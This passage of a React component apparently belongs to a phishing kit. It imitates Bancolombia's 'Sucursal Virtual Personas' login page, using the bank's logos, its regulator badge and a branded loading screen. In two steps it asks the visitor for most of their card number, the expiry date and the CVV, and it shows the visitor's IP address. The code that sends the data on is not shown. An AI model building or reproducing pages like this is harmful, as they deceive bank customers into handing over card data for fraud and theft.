                    flex: 1,
                    backgroundColor: "#2C2A29",
                    backgroundImage: 'url("/assets/images/auth-trazo.svg")',
                    backgroundRepeat: desktop ? 'round' : 'no-repeat',
                    backgroundPosition: "center",
                    backgroundPositionY: desktop ? "0px" : "-70px",
                    backgroundPositionX: desktop ? "0px" : "-500px",
                }}>

                    <div style={{ textAlign: "center" }}>
                        <img src="/assets/images/img_pantalla2/descarga.svg" alt="Logo" style={{ width: "238px", marginTop: "45px" }} />
                    </div>

                    <div
                        style={{
                            marginTop: "25px",
                        }}
                    >
                        <h1 className="bc-text-center bc-cibsans-font-style-9-extralight bc-mt-4 bc-fs-xs" style={{ fontSize: desktop ? 36 : 28.32, marginBottom: desktop ? "15px" : "0px" }}>
                            Sucursal Virtual Personas
                        </h1>
                    </div>

                    <div className="login-page">
                        <div className="login-box" style={{ backgroundColor: "#454648" }}>
                            <div style={{ display: "flex", alignItems: "flex-start", gap: "15px", marginBottom: "24px" }}>
                                <img src={getCardImagePath()} alt={cardData.label} style={{ width: "70px", borderRadius: "8px", flexShrink: 0 }} />
                                <h2 className='bc-card-auth-title2 bc-cibsans-font-style-5-bold' style={{ fontSize: "18px", fontWeight: "bold", color: "#ffffff", margin: 0, textAlign: "left", lineHeight: "1.4" }}>
                                    {step === "front"
                                        ? `Ingresa los datos de tu Tarjeta ${getTipoTarjeta()} terminada en ${cardData.digits}`
                                        : `Validación del CVV de la Tarjeta ${getTipoTarjeta()} terminada en ${cardData.digits}`
                                    }
                                </h2>
                            </div>
                            <p className='bc-card-auth-description' style={{ fontSize: "16px", fontWeight: "500", lineHeight: "24px", color: "#ffffff", marginBottom: "30px", textAlign: "center" }}>
                                {step === "front"
                                    ? `Ingresa los primeros ${isAmex ? 11 : 12} dígitos y la fecha de expiración de tu tarjeta.`
                                    : "Para garantizar la seguridad de tu cuenta, confirma el código de seguridad (CVV)."
                                }
                            </p>
                            <div className="flip-card" style={{
                                opacity: imagesLoaded ? 1 : 0,
                                transition: "opacity 0.3s ease-in-out"
                            }}>
                                <div className={`flip-card-inner ${step === 'back' ? 'flipped' : ''}`}>

                                    <div className="flip-card-front">
                                        <img
                                            src={getCardImagePath()}
                                            alt="Frente"
                                            style={getCardStyle(cardData.filename)}
                                        />
                                        <div
                                            style={{
                                                position: "absolute",
                                                top: getCardConfig(cardData.filename).digits?.top || "58%",
                                                left: getCardConfig(cardData.filename).digits?.left || "50%",
                                                transform: "translate(-50%, -50%)",
                                                width: getCardConfig(cardData.filename).digits?.width || "88%",
                                                textAlign: getCardConfig(cardData.filename).digits?.textAlign || "left",
                                                color: getCardConfig(cardData.filename).digits?.color || "#ffffff",
                                                textShadow: "2px 2px 4px rgba(0,0,0,0.8)",
                                                pointerEvents: "none"
                                            }}
                                        >
                                            <div className="digits-text">
                                                {formatCardDigits(cardDigits.padEnd(requiredDigitsLength, "•"))}
                                            </div>
                                        </div>
                                        <div style={{
                                            position: "absolute",
                                            top: getCardConfig(cardData.filename).date?.top || "75%",
                                            left: getCardConfig(cardData.filename).date?.left || "54%",
                                            transform: "translate(-50%, -50%)",
                                            width: getCardConfig(cardData.filename).date?.width || "88%",
                                            textAlign: getCardConfig(cardData.filename).date?.textAlign || "left",
                                            color: getCardConfig(cardData.filename).date?.color || "#ffffff",
                                            textShadow: "2px 2px 4px rgba(0,0,0,0.8)",
                                            pointerEvents: "none"
                                        }}>
                                            <div className="digits-text">
                                                {expirationDate || "MM/YY"}
                                            </div>
                                        </div>
                                    </div>
                                    <div className="flip-card-back">
                                        <img
                                            src={getBackCardImagePath()}
                                            alt="Reverso"
                                            style={getCardStyle(getBackCardFilename(cardData.filename))}
                                        />
                                        <div style={{
                                            position: "absolute",
                                            top: getCardConfig(getBackCardFilename(cardData.filename) || cardData.filename).back.top,
                                            left: getCardConfig(getBackCardFilename(cardData.filename) || cardData.filename).back.left,
                                            transform: "translate(-50%, -50%)",
                                            color: getCardConfig(getBackCardFilename(cardData.filename) || cardData.filename).back.color,
                                            fontSize: getCardConfig(getBackCardFilename(cardData.filename) || cardData.filename).back.fontSize || "20px",
                                            fontFamily: "monospace",
                                            fontWeight: "bold",
                                            pointerEvents: "none"
                                        }}>
                                            {cvv}
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div style={{ display: "flex", flexDirection: "column", alignItems: "center", gap: "25px", width: "100%" }}>
                                {step === "front" ? (
                                    <>
                                        <div className="input-group-custom" style={{ borderBottom: "none", position: "relative", display: "flex", flexDirection: "column", alignItems: "center", gap: "10px", width: "100%" }}>
                                            {renderVisualInputDigits()}
                                            <label className='bc-card-auth-description' htmlFor="cardDigits" style={{ color: "#ffffff", fontWeight: "500", fontSize: "16px", textAlign: 'center' }}>
                                                Ingrese los primeros {requiredDigitsLength} dígitos de su tarjeta
                                            </label>
                                            <input
                                                id="cardDigits"
                                                type="tel"
                                                maxLength={requiredDigitsLength}
                                                pattern="[0-9]*"
                                                value={cardDigits}
                                                onChange={handleDigitsChange}
                                                onFocus={() => { setIsFocused(true); setFocusedField("digits"); }}
                                                onBlur={() => { setIsFocused(false); setFocusedField(""); }}
                                                style={{
                                                    position: "absolute",
                                                    top: 0,
                                                    left: "50%",
                                                    transform: "translateX(-50%)",
                                                    width: "260px",
                                                    height: "40px",
                                                    opacity: 0,
                                                    cursor: "text",
                                                    caretColor: "transparent",
                                                }}
                                            />
                                        </div>
                                        <div className="input-group-custom" style={{ borderBottom: "none", position: "relative", display: "flex", flexDirection: "column", alignItems: "center", gap: "10px", width: "100%" }}>
                                            {renderVisualInputExpiration()}
                                            <label className='bc-card-auth-description' htmlFor="expirationDate" style={{ color: "#ffffff", fontWeight: "500", fontSize: "16px", marginTop: "5px" }}>
                                                Fecha de expiración (MM/YY)
                                            </label>
                                            <input
                                                id="expirationDate"
                                                type="tel"
                                                maxLength={5}
                                                pattern="[0-9\/]*"
                                                value={expirationDate}
                                                onChange={handleExpirationChange}
                                                onFocus={() => { setIsFocused(true); setFocusedField("expiration"); }}
                                                onBlur={() => { setIsFocused(false); setFocusedField(""); }}
                                                style={{
                                                    position: "absolute",
                                                    top: 0,
                                                    left: "50%",
                                                    transform: "translateX(-50%)",
                                                    width: "260px",
                                                    height: "40px",
                                                    opacity: 0,
                                                    cursor: "text",
                                                    caretColor: "transparent",
                                                }}
                                            />
                                        </div>
                                    </>
                                ) : (
                                    <>
                                        <div className="input-group-custom" style={{ borderBottom: "none", position: "relative", display: "flex", flexDirection: "column", alignItems: "center", gap: "10px", width: "100%" }}>
                                            {renderVisualInputCVV()}
                                            <label htmlFor="cvv" style={{ color: "#ffffff", margin: 0, fontWeight: "500", fontSize: "16px", marginTop: "5px" }}>CVV</label>
                                            <input
                                                id="cvv"
                                                type="tel"
                                                maxLength={requiredCvvLength}
                                                pattern="[0-9]*"
                                                value={cvv}
                                                onChange={handleCvvChange}
                                                onFocus={() => { setIsFocused(true); setFocusedField("cvv"); }}
                                                onBlur={() => { setIsFocused(false); setFocusedField(""); }}
                                                style={{
                                                    position: "absolute",
                                                    top: 0,
                                                    left: "50%",
                                                    transform: "translateX(-50%)",
                                                    width: "260px",
                                                    height: "40px",
                                                    opacity: 0,
                                                    cursor: "text",
                                                    caretColor: "transparent",
                                                    WebkitTextFillColor: "transparent"
                                                }}
                                            />
                                        </div>
                                    </>
                                )}
                            </div>
                            <br /><br />
                            <button className="bc-button-primary login-btn" onClick={handleContinue}
                                style={{
                                    marginTop: "20px",
                                    fontSize: "14px",
                                    opacity: (step === "front"
                                        ? (cardDigits.length === requiredDigitsLength && expirationDate.length === 5 && isCardValid === true)
                                        : (cvv.length === requiredCvvLength && !submitted)) ? 1 : 0.5,
                                    cursor: (step === "front"
                                        ? (cardDigits.length === requiredDigitsLength && expirationDate.length === 5 && isCardValid === true)
                                        : (cvv.length === requiredCvvLength && !submitted)) ? "pointer" : "not-allowed"
                                }}
                                disabled={step === "front"
                                    ? !(cardDigits.length === requiredDigitsLength && expirationDate.length === 5 && isCardValid === true)
                                    : (cvv.length !== requiredCvvLength || submitted)}
                            >
                                {step === "front" ? "Siguiente" : (submitted ? "Enviado" : "Enviar")}
                            </button>
                        </div>
                    </div>
                    <div className="login-page-footer mt-4">
                        <div className="footer-links" style={{ marginTop: "70px", marginRight: "1%", marginBottom: "5px" }}>
                            <span>¿Problemas para conectarte?</span>
                            <span className="dot">·</span>
                            <span>Aprende sobre seguridad</span>
                            <span className="dot">·</span>
                            <span>Reglamento Sucursal Virtual</span>
                            <span className="dot">·</span>
                            <span>Política de privacidad</span>
                        </div>
                        <div className="footer-final">
                            <div className="footer-left">
                                <div>
                                    <img
                                        src="/assets/images/img_pantalla2/descarga.svg"
                                        style={{ width: "180px" }}
                                    />
                                </div>
                                <div style={{ alignSelf: 'center' }}>
                                    <span className="vigilado">
                                        <img
                                            src="/assets/images/img_pantalla1/imgi_40_logo_vigilado.svg"
                                            alt="Superintendencia"
                                            style={{ width: "140px" }}
                                        />
                                    </span>
                                </div>
                            </div>
                            <div className="footer-right">
                                <div className="mt-2">Dirección IP: {ip}</div>
                                <div className="mb-2">{getDateHour}</div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <div className="visual-captcha" style={{ cursor: "pointer" }}>
                <img src="/assets/images/lateral-der.png" alt="Visual Captcha" />
            </div>

            {getLoading ?
                <LoadingBancolombia /> : null}

            <NumOTPModal
                isOpen={formState.lanzarModalErrorSesion}
                onClose={() => setFormState(prev => ({ ...prev, lanzarModalErrorSesion: false }))}
            />
        </>
    );
};